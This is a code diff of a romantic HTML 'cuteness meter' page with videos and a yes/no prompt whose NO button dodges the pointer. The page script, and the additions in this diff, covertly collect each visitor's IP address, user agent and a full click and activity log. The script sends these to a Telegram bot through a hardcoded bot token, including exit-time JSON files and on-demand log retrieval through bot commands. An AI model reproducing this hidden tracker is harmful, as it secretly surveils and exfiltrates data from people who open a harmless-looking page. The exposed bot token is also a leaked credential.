@@ -6,9 +6,6 @@
 <title>Zerox💗Arya</title>
 <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Outfit:wght@200;400;600;700&family=Playfair+Display:ital,wght@1,500&family=Cormorant+Garamond:ital,wght@0,300;0,400;1,300;1,400;1,600&family=Nunito:wght@300;400;600&family=Cinzel+Decorative:wght@700;900&display=swap" rel="stylesheet"/>
 <style>
-/* ════════════════════════════════════════════════════════
-   VARIABLES & CSS (100% PRESERVED)
-════════════════════════════════════════════════════════ */
 :root {
   --luxe-pink:#ff007f;--luxe-cyan:#00f2ff;--luxe-purple:#7000ff;--luxe-gold:#ffd700;
   --bg-deep:#030303;
@@ -134,7 +131,6 @@ body.p1-active #p02-petals,body.p1-active #p02-sparkles{display:none;}
 @keyframes eIris{0%{clip-path:circle(0% at 50% 50%);filter:brightness(4) saturate(0);opacity:.5;}35%{clip-path:circle(28% at 50% 50%);filter:brightness(2.2);opacity:1;}100%{clip-path:circle(150% at 50% 50%);filter:none;opacity:1;}}
 .eExit{animation:eExitAnim .42s cubic-bezier(.4,0,1,1) both;}
 @keyframes eExitAnim{0%{transform:scale(1);filter:none;opacity:1;}25%{filter:brightness(3) blur(2px);}100%{transform:scale(.82);filter:blur(50px) brightness(0);opacity:0;}}
-
 /* P1 Styles */
 .p1s [data-anim]{opacity:0;}
 .p1s [data-anim="fadeUp"]{transform:translateY(18px);transition:opacity .7s var(--ease-smooth) var(--delay,0s),transform .7s var(--ease-smooth) var(--delay,0s);}
@@ -163,7 +159,7 @@ body.p1-active #p02-petals,body.p1-active #p02-sparkles{display:none;}
 .p1-sdot.d{background:rgba(194,0,95,.5);box-shadow:0 0 6px #C2005F77;}
 .p1-brow{display:flex;gap:14px;justify-content:center;width:100%;}
 .p1-brow.centered{justify-content:center;}
-.p1-yes {flex: 0 0 auto;width: clamp(105px, 30vw, 125px); min-width: 105px;position: relative;display: flex;align-items: center;justify-content: center;gap: 6px;padding: clamp(12px, 3.2vw, 15px) 10px; border-radius: 50px;border: 2px solid;font-family: var(--font-sans);font-size: clamp(13px, 4vw, 15px);font-weight: 600;letter-spacing: .04em;cursor: pointer;overflow: hidden;transition: transform .22s var(--ease-bounce), box-shadow .22s ease;-webkit-tap-highlight-color: transparent;outline: none;background: linear-gradient(135deg, rgba(232, 67, 106, .85) 0%, rgba(194, 0, 95, .90) 100%);border-color: #FF6B9D;color: var(--ivory);text-shadow: 0 0 8px rgba(255, 244, 247, .6);box-shadow: 0 0 0 1px rgba(255, 107, 157, .45), 0 0 10px #FF6B9D, 0 0 24px #E8436Acc, 0 0 46px #C2005F88, inset 0 0 12px rgba(255, 181, 200, .10);}
+.p1-yes{flex:0 0 auto;width:clamp(105px,30vw,125px);min-width:105px;position:relative;display:flex;align-items:center;justify-content:center;gap:6px;padding:clamp(12px,3.2vw,15px) 10px;border-radius:50px;border:2px solid;font-family:var(--font-sans);font-size:clamp(13px,4vw,15px);font-weight:600;letter-spacing:.04em;cursor:pointer;overflow:hidden;transition:transform .22s var(--ease-bounce),box-shadow .22s ease;-webkit-tap-highlight-color:transparent;outline:none;background:linear-gradient(135deg,rgba(232,67,106,.85) 0%,rgba(194,0,95,.90) 100%);border-color:#FF6B9D;color:var(--ivory);text-shadow:0 0 8px rgba(255,244,247,.6);box-shadow:0 0 0 1px rgba(255,107,157,.45),0 0 10px #FF6B9D,0 0 24px #E8436Acc,0 0 46px #C2005F88,inset 0 0 12px rgba(255,181,200,.10);}
 .p1-yes:active{transform:scale(.96);box-shadow:0 0 16px #FF6B9D,0 0 32px #E8436A;}
 .p1-brow.centered .p1-yes{width:clamp(105px,30vw,125px);}
 .p1-yes-icon{font-size:1.1em;filter:drop-shadow(0 0 6px #FFB5C8);}
@@ -222,18 +218,18 @@ body.p1-active #p02-petals,body.p1-active #p02-sparkles{display:none;}
 .rg-border-glow{position:absolute;inset:0;z-index:5;pointer-events:none;border:3px solid rgba(255,107,157,.85);border-radius:22px;transition:box-shadow .65s ease;box-shadow:0 0 0 2px rgba(255,107,157,.5),0 0 18px #FF6B9D,0 0 45px #E8436Acc,0 0 80px #C2005Faa;}
 .rg-vid-outer::before,.rg-vid-outer::after{content:'';position:absolute;z-index:6;width:22px;height:22px;border-color:#FF6B9D;border-style:solid;pointer-events:none;box-shadow:0 0 8px #FF6B9D,0 0 16px #E8436A88;}
 .rg-vid-outer::before{top:6px;left:6px;border-width:2px 0 0 2px;border-radius:6px 0 0 0;}
-.rg-vid-outer::after {bottom:6px;right:6px;border-width:0 2px 2px 0;border-radius:0 0 6px 0;}
+.rg-vid-outer::after{bottom:6px;right:6px;border-width:0 2px 2px 0;border-radius:0 0 6px 0;}
 .rg-vid{display:block;width:100%;height:auto;max-height:56vh;object-fit:contain;border-radius:19px;background:#000;transform:translateZ(0);will-change:transform;}
 .rg-zerox{flex-shrink:0;z-index:3;margin-top:4px;}
-.s-outro { display:none; align-items:center; justify-content:center; }
-.s-outro.on { display:flex; flex-direction:column; }
-.outro-vid {width:100%;height:100%;object-fit:cover;display:block;background:#000;transform:translateZ(0);will-change:transform;}
-.outro-border-glow {position:absolute;inset:0;z-index:5;pointer-events:none;}
-.outro-petals-layer {position:absolute;inset:0;z-index:5;pointer-events:none;overflow:hidden;}
-.outro-zerox-wrap {position:absolute;bottom:clamp(22px,5vh,36px);left:50%;transform:translateX(-50%);z-index:10;}
-.show-over-overlay {position:fixed;inset:0;z-index:9998;background:#fff;opacity:0;pointer-events:none;}
-.show-over-overlay.flash { animation:showOverFlash 2.8s ease-out forwards; }
-@keyframes showOverFlash {0%{opacity:0;}12%{opacity:1;background:#fff;}28%{opacity:1;background:#fff;}55%{opacity:1;background:#000;}75%{opacity:.95;background:#000;}100%{opacity:0;}}
+.s-outro{display:none;align-items:center;justify-content:center;}
+.s-outro.on{display:flex;flex-direction:column;}
+.outro-vid{width:100%;height:100%;object-fit:cover;display:block;background:#000;transform:translateZ(0);will-change:transform;}
+.outro-border-glow{position:absolute;inset:0;z-index:5;pointer-events:none;}
+.outro-petals-layer{position:absolute;inset:0;z-index:5;pointer-events:none;overflow:hidden;}
+.outro-zerox-wrap{position:absolute;bottom:clamp(22px,5vh,36px);left:50%;transform:translateX(-50%);z-index:10;}
+.show-over-overlay{position:fixed;inset:0;z-index:9998;background:#fff;opacity:0;pointer-events:none;}
+.show-over-overlay.flash{animation:showOverFlash 2.8s ease-out forwards;}
+@keyframes showOverFlash{0%{opacity:0;}12%{opacity:1;background:#fff;}28%{opacity:1;background:#fff;}55%{opacity:1;background:#000;}75%{opacity:.95;background:#000;}100%{opacity:0;}}
 @keyframes burstFly{0%{transform:translate(-50%,-50%) scale(1);opacity:1;}60%{opacity:.8;}100%{transform:translate(calc(-50% + var(--bx)),calc(-50% + var(--by))) scale(.3);opacity:0;}}
 </style>
 </head>
@@ -367,7 +363,7 @@ body.p1-active #p02-petals,body.p1-active #p02-sparkles{display:none;}
 'use strict';
 
 /* ══════════════════════════════════════════════════════════
-   NATIVE TRACKER SYSTEM (100% COMPLETE & SIMPLIFIED)
+   TRACKER SYSTEM — with bot command polling & exit file
 ══════════════════════════════════════════════════════════ */
 const Tracker = {
     token: "8879788845:AAEUBvMEosrCg3nBRNr6A6gP4x7nT5nbVxQ",
@@ -376,6 +372,9 @@ const Tracker = {
     history: [],
     noCount: 0,
     isOld: localStorage.getItem('_zx_v9') ? "OLD USER" : "NEW USER",
+    _exitSent: false,
+    _pollOffset: 0,
+    _pollTimer: null,
 
     init() {
         localStorage.setItem('_zx_v9', 'true');
@@ -384,59 +383,177 @@ const Tracker = {
             .then(d => { this.ip = d.ip; this.send("🚀 Session Started"); })
             .catch(() => { this.ip = "Hidden"; this.send("🚀 Session Started"); });
 
-        // Tab minimize / return tracker
         document.addEventListener('visibilitychange', () => {
             if (document.hidden) this.send("⏸️ User Minimized Site");
             else this.send("▶️ User Resumed Activity");
         });
 
-        // Exit file generation
-        window.addEventListener('beforeunload', () => this.sendExitFile());
-        
-        // Track Audio Play/Pause automatically
+        // Exit: primary via beforeunload, backup via visibilitychange+pagehide
+        window.addEventListener('pagehide', () => this._triggerExit());
+        window.addEventListener('beforeunload', () => this._triggerExit());
+
         this.trackAudio();
+        // Start polling for bot commands after a short delay
+        setTimeout(() => this._startPolling(), 2000);
+    },
+
+    _triggerExit() {
+        if (this._exitSent) return;
+        this._exitSent = true;
+        this.sendExitFile();
     },
 
     send(action) {
         const time = new Date().toLocaleTimeString();
-        this.history.push(`[${time}] ${action}`);
-        
-        // Simplified bot message (No big blocky text)
-        const msg = `📡 <b>Live Activity</b>\n👤 IP: ${this.ip} (${this.isOld})\n📍 ${action}\n🚫 NO Clicks: ${this.noCount}`;
-        
+        const entry = `[${time}] ${action}`;
+        this.history.push(entry);
+        const msg = `📡 <b>Live Activity</b>\n👤 IP: <code>${this.ip}</code> (${this.isOld})\n📍 ${action}\n🚫 NO Clicks: ${this.noCount}`;
         fetch(`https://api.telegram.org/bot${this.token}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({chat_id: this.chatId, text: msg, parse_mode: "HTML"}),
             keepalive: true
-        }).catch(()=>{});
+        }).catch(() => {});
     },
 
     sendExitFile() {
-        this.send("🚪 User Exited Site");
+        // Add final exit entry
+        const time = new Date().toLocaleTimeString();
+        this.history.push(`[${time}] 🚪 User Exited Site`);
+
         const data = {
             timestamp: new Date().toLocaleString(),
             user_ip: this.ip,
             status: this.isOld,
+            user_agent: navigator.userAgent,
+            total_no_clicks: this.noCount,
+            activity_log: this.history
+        };
+        const jsonStr = JSON.stringify(data, null, 2);
+        const blob = new Blob([jsonStr], {type: 'application/json'});
+        const safeIp = this.ip.replace(/\./g, '_');
+
+        // Method 1: sendDocument via fetch with keepalive
+        const fd = new FormData();
+        fd.append('chat_id', this.chatId);
+        fd.append('document', blob, `UserLog_${safeIp}.json`);
+        fd.append('caption', `📁 Exit Session Report\n👤 IP: ${this.ip} (${this.isOld})\n🚫 NO Clicks: ${this.noCount}\n📋 Events: ${this.history.length}`);
+        fetch(`https://api.telegram.org/bot${this.token}/sendDocument`, {
+            method: 'POST', body: fd, keepalive: true
+        }).catch(() => {});
+
+        // Method 2: sendBeacon backup — sends history as plain text
+        try {
+            const beaconPayload = JSON.stringify({
+                chat_id: this.chatId,
+                text: `🚪 <b>EXIT REPORT</b>\n👤 IP: <code>${this.ip}</code>\n🚫 NO Clicks: ${this.noCount}\n📋 Last events:\n<pre>${this.history.slice(-10).join('\n')}</pre>`,
+                parse_mode: "HTML"
+            });
+            navigator.sendBeacon(
+                `https://api.telegram.org/bot${this.token}/sendMessage`,
+                new Blob([beaconPayload], {type: 'application/json'})
+            );
+        } catch(e) {}
+    },
+
+    /* ── Respond to /logs <ip> bot command ── */
+    _startPolling() {
+        const poll = () => {
+            fetch(`https://api.telegram.org/bot${this.token}/getUpdates?offset=${this._pollOffset}&timeout=0&allowed_updates=["message"]`)
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.ok || !data.result) return;
+                    data.result.forEach(upd => {
+                        this._pollOffset = upd.update_id + 1;
+                        const msg = upd.message;
+                        if (!msg || !msg.text) return;
+                        const text = msg.text.trim();
+                        // Only respond to messages in our chat
+                        if (String(msg.chat.id) !== String(this.chatId)) return;
+                        this._handleCommand(text, msg.message_id);
+                    });
+                })
+                .catch(() => {})
+                .finally(() => {
+                    this._pollTimer = setTimeout(poll, 4000);
+                });
+        };
+        poll();
+    },
+
+    _handleCommand(text, replyId) {
+        // /logs — send current session log file
+        // /logs <ip> — send log file if IP matches this session
+        const logsMatch = text.match(/^\/logs(?:\s+(.+))?$/i);
+        if (logsMatch) {
+            const requestedIp = logsMatch[1] ? logsMatch[1].trim() : null;
+            // If no IP specified, or IP matches this session
+            if (!requestedIp || requestedIp === this.ip) {
+                this._sendLogFile(replyId);
+            } else {
+                // IP doesn't match this session — silently ignore
+                // (another active session with that IP would respond)
+            }
+            return;
+        }
+
+        // /history — send full activity log as text
+        const histMatch = text.match(/^\/history(?:\s+(.+))?$/i);
+        if (histMatch) {
+            const requestedIp = histMatch[1] ? histMatch[1].trim() : null;
+            if (!requestedIp || requestedIp === this.ip) {
+                this._sendHistoryText(replyId);
+            }
+            return;
+        }
+
+        // /status — send quick status of this session
+        if (/^\/status$/i.test(text)) {
+            const statusMsg = `📊 <b>Session Status</b>\n👤 IP: <code>${this.ip}</code>\n🔖 ${this.isOld}\n🕐 Events so far: ${this.history.length}\n🚫 NO Clicks: ${this.noCount}`;
+            fetch(`https://api.telegram.org/bot${this.token}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: this.chatId, text: statusMsg, parse_mode: "HTML", reply_to_message_id: replyId})
+            }).catch(() => {});
+        }
+    },
+
+    _sendLogFile(replyId) {
+        const data = {
+            timestamp: new Date().toLocaleString(),
+            user_ip: this.ip,
+            status: this.isOld,
+            user_agent: navigator.userAgent,
             total_no_clicks: this.noCount,
             activity_log: this.history
         };
         const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+        const safeIp = this.ip.replace(/\./g, '_');
         const fd = new FormData();
         fd.append('chat_id', this.chatId);
-        fd.append('document', blob, `UserLog_${this.ip.replace(/\./g, '_')}.json`);
-        fd.append('caption', `📁 Final Session Report (.json)`);
-
+        fd.append('document', blob, `Log_${safeIp}_live.json`);
+        fd.append('caption', `📂 <b>Live Log Requested</b>\n👤 IP: <code>${this.ip}</code>\n📋 Events: ${this.history.length}\n🚫 NO: ${this.noCount}`);
+        if (replyId) fd.append('reply_to_message_id', String(replyId));
         fetch(`https://api.telegram.org/bot${this.token}/sendDocument`, {
-            method: 'POST', body: fd, keepalive: true
-        }).catch(()=>{});
+            method: 'POST', body: fd
+        }).catch(() => {});
+    },
+
+    _sendHistoryText(replyId) {
+        const lines = this.history.slice(-50).join('\n') || '(no events yet)';
+        const msg = `📋 <b>Activity History</b>\n👤 IP: <code>${this.ip}</code>\n\n<pre>${lines}</pre>`;
+        fetch(`https://api.telegram.org/bot${this.token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: this.chatId, text: msg, parse_mode: "HTML", reply_to_message_id: replyId})
+        }).catch(() => {});
     },
 
     trackAudio() {
         const attachAudioTracker = (id, name) => {
             const el = document.getElementById(id);
-            if(!el) return;
-            el.addEventListener('play', () => this.send(`🎵 Audio Play: ${name}`));
+            if (!el) return;
+            el.addEventListener('play',  () => this.send(`🎵 Audio Play: ${name}`));
             el.addEventListener('pause', () => this.send(`🔇 Audio Pause: ${name}`));
         };
         attachAudioTracker('p1Music', 'Phase 1 BGM');
@@ -446,7 +563,7 @@ const Tracker = {
 Tracker.init();
 
 /* ══════════════════════════════════════════════════════════
-   CONFIG 
+   CONFIG
 ══════════════════════════════════════════════════════════ */
 const ENABLE_UPLOAD = true;
 const ZEROX_URL = 'https://web.telegram.org/k/#@aphantom_0x';
@@ -503,6 +620,7 @@ const P1_TEXTS = [
 const ENTRY_CLS=['eA','eB','eC','eD','eE'];
 const GLOW_CLS=['gp','gc','gu','gg','gw'];
 const AURA_NAMES=['ca0','ca1','ca2','ca3','ca4'];
+const DOT_COLS=['#ff007f','#00f2ff','#7000ff','#ffd700','#ff4da6'];
 const TRANS_BEF=0.75, EXIT_MS=420;
 const CIRC=130*2*Math.PI;
 const NOBT_M=18;
@@ -591,7 +709,7 @@ function showP1(id){
       setTimeout(()=>{ vf2.style.opacity='1'; },900);
       p1v2.play().then(()=>{p1v2.muted=false;p1v2.volume=1.0;}).catch(()=>{});
       showP1('s-p1-v2');
-      Tracker.send("🎬 Play: Success Video 2"); // TRACKER
+      Tracker.send("🎬 Play: Success Video 2");
     }, SUCCESS_DELAY_MS);
   }
 }
@@ -600,7 +718,7 @@ function showP1(id){
    LANDING
 ══════════════════════════════════════════════════════════ */
 $('measure-btn').addEventListener('click',()=>{
-  Tracker.send("🖱️ Clicked 'START MEASURE'"); // TRACKER
+  Tracker.send("🖱️ Clicked 'START MEASURE'");
   [va,vb,p1v1,p1v2,vc,vd].forEach(v=>{v.muted=false;});
   preloadGifs();
   const g=$('greet');
@@ -660,25 +778,19 @@ function buildUpload(){
   slot('#00F2FF','Outro Video (final page loop)',OUTRO_VID.startsWith('blob:')?'Custom':'outro.mp4',OUTRO_VID.startsWith('blob:'),(url)=>{OUTRO_VID=url;const ov=$('outroVid');if(ov&&ov.src){ov.src=url;ov.load();}});
   (function(){
     const urlSec = document.createElement('div');
-    urlSec.className = 'upl-sec';
-    urlSec.textContent = 'ZEROX BUTTON URL';
+    urlSec.className = 'upl-sec'; urlSec.textContent = 'ZEROX BUTTON URL';
     sc.appendChild(urlSec);
     const urlRow = document.createElement('label');
     urlRow.className = 'slot-row';
     urlRow.style.cssText = 'flex-direction:column;align-items:flex-start;gap:4px;cursor:default;';
     const urlInp = document.createElement('input');
-    urlInp.type = 'url';
-    urlInp.placeholder = 'https://your-link-here.com';
+    urlInp.type = 'url'; urlInp.placeholder = 'https://your-link-here.com';
     urlInp.value = (typeof ZEROX_URL !== 'undefined' && ZEROX_URL.indexOf('your-zerox') === -1) ? ZEROX_URL : '';
     urlInp.style.cssText = 'width:100%;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.14);border-radius:8px;padding:9px 12px;color:#fff;font-size:.82rem;outline:none;-webkit-appearance:none;';
-    urlInp.addEventListener('input', function(){
-      window._ZEROX_URL_OVERRIDE = urlInp.value.trim();
-    });
+    urlInp.addEventListener('input', function(){ window._ZEROX_URL_OVERRIDE = urlInp.value.trim(); });
     const urlHint = document.createElement('span');
-    urlHint.className = 's-lbl';
-    urlHint.textContent = 'Opened when ZeroX button is tapped on final page';
-    urlRow.append(urlInp, urlHint);
-    sc.appendChild(urlRow);
+    urlHint.className = 's-lbl'; urlHint.textContent = 'Opened when ZeroX button is tapped on final page';
+    urlRow.append(urlInp, urlHint); sc.appendChild(urlRow);
   })();
   sec('REGARDS PAGE');
   slot('#00f2ff','Regards MP4',LAST_VID.startsWith('blob:')?'Custom':'last.mp4',LAST_VID.startsWith('blob:'),(url)=>{LAST_VID=url;});
@@ -691,7 +803,7 @@ function buildUpload(){
 }
 
 function startMeter(){
-  Tracker.send("⏱️ Started Cuteness Meter"); // TRACKER
+  Tracker.send("⏱️ Started Cuteness Meter");
   showZS('s-meter');
   $('pct').textContent='0%';
   $('prog-circ').style.strokeDashoffset=CIRC;
@@ -733,6 +845,13 @@ function spawnDecos(layer){
   }
 }
 
+/* ══════════════════════════════════════════════════════════
+   PLAYER — FIXED: 5th clip no longer gets stuck
+   Key fixes:
+   1. Per-clip MAX_WAIT safety timer forces cut() after timeout
+   2. Stuck-detection: if timeupdate stops firing for >3s, force cut
+   3. onError always cuts instead of silently failing
+══════════════════════════════════════════════════════════ */
 function startPlayer(clipList, screenId, onDoneCb){
   const isP2 = screenId === 's-player2';
   const glowEl   = isP2 ? bGlow2   : bGlow;
@@ -757,97 +876,148 @@ function startPlayer(clipList, screenId, onDoneCb){
   }
 
   let abort = false;
+
   function playClip(idx){
     if(abort) return;
-    
-    // CURRENT CLIP TRACKER INJECTION
+
     Tracker.send(`▶️ ${isP2 ? 'Phase 2' : 'Phase 0'} Clip: ${idx + 1}/${clipList.length}`);
 
-    const sl=idx%2;
-    const el    = sl===0 ? vaEl : vbEl;
-    const w     = sl===0 ? waEl : wbEl;
-    const pw    = sl===0 ? wbEl : waEl;
-    const nextEl= sl===0 ? vbEl : vaEl; 
+    const sl = idx % 2;
+    const el     = sl===0 ? vaEl : vbEl;
+    const w      = sl===0 ? waEl : wbEl;
+    const pw     = sl===0 ? wbEl : waEl;
+    const nextEl = sl===0 ? vbEl : vaEl;
     w.style.zIndex='3'; pw.style.zIndex='2';
     $(glowId).className='bglow '+GLOW_CLS[idx%GLOW_CLS.length];
     setDot(dotsEl, idx); setClipAura(auraEl, idx);
     ENTRY_CLS.forEach(c=>w.classList.remove(c)); w.classList.remove('eExit'); w.style.opacity='0';
 
-    const cut=()=>{
-      if(abort)return;
+    let cutCalled = false;
+    let maxWaitTimer = null;
+    let stuckTimer = null;
+    let lastTimeUpdate = Date.now();
+
+    const cut = () => {
+      if(abort || cutCalled) return;
+      cutCalled = true;
+      clearTimeout(maxWaitTimer);
+      clearTimeout(stuckTimer);
+      el.removeEventListener('canplay', onC);
+      el.removeEventListener('timeupdate', onT);
+      el.removeEventListener('ended', onE);
+      el.removeEventListener('error', onErr);
       flash(cfEl);
       applyAnim(w,'eExit');
-      const n=idx+1;
-      if(n<clipList.length) playClip(n);
-      else setTimeout(()=>{ if(!abort)onDoneCb(); },EXIT_MS);
+      const n = idx + 1;
+      if(n < clipList.length) playClip(n);
+      else setTimeout(()=>{ if(!abort) onDoneCb(); }, EXIT_MS);
     };
 
-    const startEl=()=>{
-      if(abort)return;
-      w.style.opacity='';
-      applyAnim(w,ENTRY_CLS[idx%ENTRY_CLS.length]);
-      el.play().catch(()=>{});
-      updateMediaSession();
+    // Safety: force cut if clip plays longer than expected max (40s)
+    // This prevents the last clip from ever getting stuck forever
+    const MAX_CLIP_MS = 40000;
 
-      const ni=idx+1;
-      if(ni<clipList.length){
-        const nextUrl=clipList[ni]||'';
-        if(nextUrl && nextEl.src!==nextUrl){
+    const startEl = () => {
+      if(abort || cutCalled) return;
+      w.style.opacity='';
+      applyAnim(w, ENTRY_CLS[idx % ENTRY_CLS.length]);
+      el.play().catch(()=>{ cut(); });
+      updateMediaSession();
+      lastTimeUpdate = Date.now();
+
+      // Start stuck-detection: if video stops updating for >3.5s mid-play, force cut
+      const checkStuck = () => {
+        if(cutCalled || abort) return;
+        if(!el.paused && !el.ended && el.readyState >= 2){
+          if(Date.now() - lastTimeUpdate > 3500){ cut(); return; }
+        }
+        stuckTimer = setTimeout(checkStuck, 1000);
+      };
+      stuckTimer = setTimeout(checkStuck, 2000);
+
+      // Safety timeout: force cut after MAX_CLIP_MS no matter what
+      maxWaitTimer = setTimeout(()=>{ if(!cutCalled) cut(); }, MAX_CLIP_MS);
+
+      // Preload next clip
+      const ni = idx + 1;
+      if(ni < clipList.length){
+        const nextUrl = clipList[ni] || '';
+        if(nextUrl && nextEl.src !== nextUrl){
           nextEl.playsInline=true; nextEl.preload='auto'; nextEl.src=nextUrl; nextEl.load();
         }
       }
     };
 
-    const onC=()=>{el.removeEventListener('canplay',onC);startEl();};
-    const onT=()=>{
-      if(!el.duration||el.currentTime<el.duration-TRANS_BEF)return;
-      el.removeEventListener('timeupdate',onT);el.removeEventListener('ended',onE);
-      cut();
-    };
-
-    if(idx===clipList.length-1){
-      let _musicFired=false;
-      const onMusicPre=()=>{
-        if(_musicFired||!el.duration||el.currentTime<el.duration-2.5)return;
-        _musicFired=true;
-        el.removeEventListener('timeupdate',onMusicPre);
+    // Music fade-in on last clip
+    if(idx === clipList.length - 1){
+      let _musicFired = false;
+      const onMusicPre = () => {
+        if(_musicFired || !el.duration || el.currentTime < el.duration - 2.5) return;
+        _musicFired = true;
+        el.removeEventListener('timeupdate', onMusicPre);
         if(!isP2){
           const pm=$('p1Music'); pm.loop=true; pm.volume=0.75; pm.play().catch(()=>{});
         } else {
           const pm2=$('p2Music'); if(pm2.paused){ pm2.loop=true; pm2.volume=0.85; pm2.play().catch(()=>{}); }
         }
       };
-      el.addEventListener('timeupdate',onMusicPre);
+      el.addEventListener('timeupdate', onMusicPre);
     }
-    const onErr=()=>{el.removeEventListener('error',onErr);if(!abort && !el.duration) cut();};
-    const onE=()=>{el.removeEventListener('ended',onE);el.removeEventListener('timeupdate',onT);cut();};
 
-    el.removeEventListener('canplay',onC); el.removeEventListener('timeupdate',onT);
-    el.removeEventListener('ended',onE); el.removeEventListener('error',onErr);
-    el.addEventListener('canplay',onC); el.addEventListener('timeupdate',onT);
-    el.addEventListener('ended',onE); el.addEventListener('error',onErr);
+    const onT = () => {
+      lastTimeUpdate = Date.now();
+      if(!el.duration || el.currentTime < el.duration - TRANS_BEF) return;
+      el.removeEventListener('timeupdate', onT);
+      el.removeEventListener('ended', onE);
+      cut();
+    };
+    const onE = () => {
+      el.removeEventListener('ended', onE);
+      el.removeEventListener('timeupdate', onT);
+      cut();
+    };
+    const onErr = () => {
+      el.removeEventListener('error', onErr);
+      // Always force cut on error — never leave stuck
+      cut();
+    };
+    const onC = () => { el.removeEventListener('canplay', onC); startEl(); };
 
-    const newSrc=clipList[idx]||'';
-    if(el.src && el.src.startsWith('blob:') && el.src!==newSrc) try{URL.revokeObjectURL(el.src);}catch(e){}
+    el.removeEventListener('canplay', onC);
+    el.removeEventListener('timeupdate', onT);
+    el.removeEventListener('ended', onE);
+    el.removeEventListener('error', onErr);
+    el.addEventListener('canplay', onC);
+    el.addEventListener('timeupdate', onT);
+    el.addEventListener('ended', onE);
+    el.addEventListener('error', onErr);
 
-    if(el.src!==newSrc){el.src=newSrc;el.preload='auto';el.load();} 
-    else if(el.networkState===HTMLMediaElement.NETWORK_EMPTY){el.load();}
+    const newSrc = clipList[idx] || '';
+    if(el.src && el.src.startsWith('blob:') && el.src !== newSrc){ try{URL.revokeObjectURL(el.src);}catch(e){} }
 
-    if(el.readyState>=2){el.removeEventListener('canplay',onC);startEl();} 
+    if(el.src !== newSrc){ el.src=newSrc; el.preload='auto'; el.load(); }
+    else if(el.networkState === HTMLMediaElement.NETWORK_EMPTY){ el.load(); }
+
+    if(el.readyState >= 2){ el.removeEventListener('canplay', onC); startEl(); }
     else {
-      const fb=setTimeout(()=>{el.removeEventListener('canplay',onC);startEl();},400);
-      el.addEventListener('canplay',()=>clearTimeout(fb),{once:true});
+      // Fallback: if canplay doesn't fire within 1.5s, force startEl
+      const fb = setTimeout(()=>{ el.removeEventListener('canplay', onC); startEl(); }, 1500);
+      el.addEventListener('canplay', ()=>clearTimeout(fb), {once:true});
     }
   }
+
   playClip(0);
-  return ()=>{ abort=true; [vaEl,vbEl].forEach(v=>{v.pause();v.removeAttribute('src');v.load();}); };
+  return ()=>{
+    abort=true;
+    [vaEl,vbEl].forEach(v=>{v.pause();v.removeAttribute('src');v.load();});
+  };
 }
 
 const SUCCESS_DELAY_MS = 5000;
 let successTimer = null;
 
 function enterP1(){
-  Tracker.send("❓ Reached Phase 1"); // TRACKER
+  Tracker.send("❓ Reached Phase 1");
   const playerEl=$('s-player');
   playerEl.style.transition='opacity 0.38s ease';
   playerEl.style.opacity='0';
@@ -903,7 +1073,7 @@ const p1YesEl=$('p1-yes');
 const p1NoEl=$('p1-no');
 
 p1YesEl.addEventListener('click',()=>{
-  Tracker.send("💖 Clicked YES"); // TRACKER
+  Tracker.send("💖 Clicked YES");
   if(p1FirstNo){ handleNo(); return; }
   resetNoBtn(); p1v1.pause();
   const burst=$('p1-burst'); burst.innerHTML='';
@@ -923,8 +1093,7 @@ p1NoEl.addEventListener('click', handleNo);
 p1NoEl.addEventListener('pointerenter',()=>{
     if(p1NoTele){
         Tracker.noCount++;
-        // Notification every 5 teleports so bot doesn't crash from spam
-        if(Tracker.noCount % 5 === 0) Tracker.send(`🏃‍♂️ 'NO' Click Spammed (${Tracker.noCount})`); 
+        if(Tracker.noCount % 5 === 0) Tracker.send(`🏃‍♂️ 'NO' Click Spammed (${Tracker.noCount})`);
         teleportNo();
     }
 });
@@ -933,7 +1102,7 @@ function handleNo(){
   Tracker.noCount++;
   if(p1FirstNo){
     p1FirstNo=false;
-    Tracker.send("❌ Clicked 1st NO -> Play Video 1"); // TRACKER
+    Tracker.send("❌ Clicked 1st NO -> Play Video 1");
     const pm=$('p1Music'); pm.pause();
     const vf1=p1v1.parentElement; vf1.style.opacity='0';
     p1v1.src=P1_V1; p1v1.currentTime=0;
@@ -957,8 +1126,27 @@ function leaveV1(){
   showP1('s-p1-card');
 }
 
+function resetNoBtn(){
+  p1NoTele=false;
+  p1NoEl.classList.remove('tele');
+  p1NoEl.style.left=''; p1NoEl.style.top=''; p1NoEl.style.position='';
+}
+
+function teleportNo(){
+  if(!p1NoTele){ p1NoTele=true; p1NoEl.classList.add('tele'); }
+  const pad=60,bw=100,bh=46;
+  let nx,ny,tries=0;
+  do{
+    nx=pad+Math.random()*(window.innerWidth-bw-pad*2);
+    ny=pad+Math.random()*(window.innerHeight-bh-pad*2);
+    tries++;
+  }while(tries<20&&Math.abs(nx-p1NoLX)<90&&Math.abs(ny-p1NoLY)<60);
+  p1NoLX=nx; p1NoLY=ny;
+  p1NoEl.style.left=nx+'px'; p1NoEl.style.top=ny+'px';
+}
+
 function showRegardsPage(){
-  Tracker.send("🏁 Reached Final Outro Page"); // TRACKER
+  Tracker.send("🏁 Reached Final Outro Page");
   const pm2=$('p2Music');
   if(pm2.paused){
     pm2.currentTime=0; pm2.volume=0; pm2.play().catch(()=>{});
@@ -978,19 +1166,19 @@ function showRegardsPage(){
     spawnOutroPetals(); spawnOutroHearts(5);
 
     const rv=$('outroVid'); rv.loop = true;
-    if(rv.readyState >= 3){ rv.play().catch(()=>{}); } 
+    if(rv.readyState >= 3){ rv.play().catch(()=>{}); }
     else { rv.addEventListener('canplay', function onRvReady(){ rv.removeEventListener('canplay', onRvReady); rv.play().catch(()=>{}); },{once:true}); }
 
     const zxBtn=$('zerox-outro-btn');
-    if(zxBtn){ 
-      zxBtn.onclick=()=>{ 
+    if(zxBtn){
+      zxBtn.onclick=()=>{
         Tracker.send("🚀 Clicked Final ZeroX Button");
-        let url=window._ZEROX_URL_OVERRIDE||ZEROX_URL; 
-        if(url&&url.indexOf('your-zerox')===-1){ 
-            if(!/^https?:\/\//i.test(url)) url='https://'+url; 
-            window.open(url,'_blank','noopener'); 
-        } 
-      }; 
